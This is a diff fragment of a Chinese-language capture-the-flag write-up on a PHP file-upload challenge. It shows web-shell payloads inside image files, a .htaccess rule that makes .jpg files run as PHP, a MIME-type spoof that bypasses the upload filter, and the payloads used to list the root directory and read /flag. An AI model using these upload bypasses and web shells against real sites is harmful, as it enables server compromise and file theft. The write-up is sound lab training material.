@@ -553,3 +553,10 @@ if (isset($_POST["upload"])) {
 `<script language='php'>system('ls')</script>`
 再上传.htaccess文件,使其将jpg文件当作php执行：
 `AddHandler application/x-httpd-php .jpg`
+提示太露骨了，修改MIME,contenttype为image/jpeg(加了文件头却出现这个问题那就是MIME没改。)
+上传成功，访问图片提示因安全问题禁用了system函数
+那连续使用这几个图片马：
+`<script language='php'>var_dump(scandir('/'));</script>`
+看到有flag文件
+`<script language='php'>var_dump(file('/flag'));</script>`
+拿到flag。
